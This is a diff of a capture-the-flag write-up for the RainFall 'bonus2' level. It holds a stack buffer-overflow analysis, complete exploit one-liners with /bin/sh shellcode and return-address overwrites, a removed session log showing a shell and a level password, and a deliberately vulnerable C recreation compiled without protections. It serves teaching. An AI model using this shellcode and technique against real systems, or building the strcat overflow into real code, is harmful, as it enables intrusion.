@@ -1,40 +1,96 @@
-return address: 0xBFFFF680 sometimes 0xBFFFF690 or 0xBFFFF6A0
-(nopsled is a good idea)
-this is where main() copies argv[1], truncates to 40 bytes via strncpy
+# ------------------------------------------------------------------------
+# analysis
+# ------------------------------------------------------------------------
 
-for exploit to work the two strings argv[1] and argv[2] have to be concatenated
-    and `LANG' variable has to be set to either `fi' or `nl'
+the main function copies the argv[1] copies 40 bytes of argv[1] string into a buffer B
+and then it copies 32 bytes of argv[2] into buffer B at index 40
+thus, if argv[1] length is equal to or greater than 40 characters the two strings become concatenated
 
-the two argv's will be concatenated only if argv[1] is at least 40 bytes long
+afterwards, the main function checks the env variable `LANG' and sets a static variable to
+either 1 if `LANG' is `fi', 2 if `LANG' is 'nl' or 0 if any other value
+
+it then passes a copy of its buffer to function `greetuser()'
+
+`greetuser()' concatenates string received from main with a localized "hello" greeting;
+
+if `LANG' is either `fi' or `nl' and the parameter passed to `greetuser()' is long enough,
+    the function overwrites it's own original ebp and return address
+
+
+# ------------------------------------------------------------------------
+# exploit
+# ------------------------------------------------------------------------
+
+shell code execution is on the stack,
+because of this the return address might be different from one execution to another;
+
+for the purpose of this informational text we'll use 0xBFFFF6A0
 
 crafted argv[1]:    nopsled + shell code
     $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") 
 
-crafted argv[2]:    filler + original EBP + return address
-    $(python -c "print('A'*14 + '\xBF\xFF\xF7\x08'[::-1] + '\xBF\xFF\xF6\x80'[::-1])")
+crafted argv[2]:    filler + ebp value + return address
+    $(python -c "print('A'*14 + '\xBF\xFF\xFF\xFF'[::-1] + '\xBF\xFF\xF6\xA0'[::-1])")
 
-if LANG=fi, bytes[18:22] of argv[2] will be return address of greetuser()
-i also found it necessary to restore the original ebp value (leave instruction),
-so bytes [14:18] will be original ebp value when entering greetuser() function
+all together:
+    export LANG=fi; /home/user/bonus2/bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*14 + '\xBF\xFF\xFF\xFF'[::-1] + '\xBF\xFF\xF6\xA0'[::-1])")
 
-if LANG=nl, bytes[23:27] of argv[2] will be return address of greetuser()
+when LANG=fi, bytes[18:22] of argv[2] will be return address of greetuser()
+
+when LANG=nl, bytes[23:27] of argv[2] will be return address of greetuser()
 
 when you are in Helsinki, you do:
-export LANG=fi; ./bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*14 + '\xBF\xFF\xF7\x08'[::-1] + '\xBF\xFF\xF6\x80'[::-1])")
-
+    export LANG=fi; ./bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*14 + '\xBF\xFF\xFF\xFF'[::-1] + '\xBF\xFF\xF6\xA0'[::-1])")
 
 and when you are in Amsterdam, you do:
-export LANG=nl; ./bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*19 + '\xBF\xFF\xF7\x08'[::-1] + '\xBF\xFF\xF6\x80'[::-1])")
+    export LANG=nl; ./bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*19 + '\xBF\xFF\xFF\xFF'[::-1] + '\xBF\xFF\xF6\xA0'[::-1])")
 
 
-# ---------------------------------------------------------------------
+# ------------------------------------------------------------------------
+# recreating the vulnerable executable
+# ------------------------------------------------------------------------
 
-bonus2@RainFall:/tmp$ export LANG=fi; /home/user/bonus2/bonus2 $(python -c "print(14*'\x90'+'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print('A'*14+'\xBF\xFF\xF6\xA0\xBF\xFF\xF7\x08'[::-1])")
-Hyvää päivää ??????????????1?1?Qh//shh/bin1??
-                                             ????̀AAAAAAAAAAAAA???????
-$ whoami
-bonus3
-$ cat /home/user/bonus3/.pass
-71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
-$
+/* compile:
+    gcc -fno-stack-protector -z execstack bonus2.c -o bonus2
+*/
 
+#include <stdlib.h>     /* getenv */
+#include <stdio.h>      /* puts */
+#include <string.h>     /* strcat */
+
+static int language;
+
+void greetuser(char *user)
+{
+    char buf[64] = {0};
+
+    if (language == 1) {
+        strcat(buf, "Hyvää päivää ");
+    } else if (language == 2) {
+        strcat(buf, "Goedemiddag! ");
+    } else {
+        strcat(buf, "Hello ");
+    }
+    puts(strcat(buf, user));
+}
+
+int main(int argc, char **argv)
+{
+    char    buf[72] = {0};
+    char    *env = NULL;
+
+    if (argc != 3)
+        return 1;
+
+    strncpy(buf, argv[1], 40);
+    strncpy(&buf[40], argv[2], 32);
+    env = getenv("LANG");
+    if (memcmp(env, "fi", 2) == 0) {
+        language = 1;
+    } else if (memcmp(env, "nl", 2) == 0) {
+        language = 2;
+    }
+
+    greetuser(buf);
+    return 0;
+}
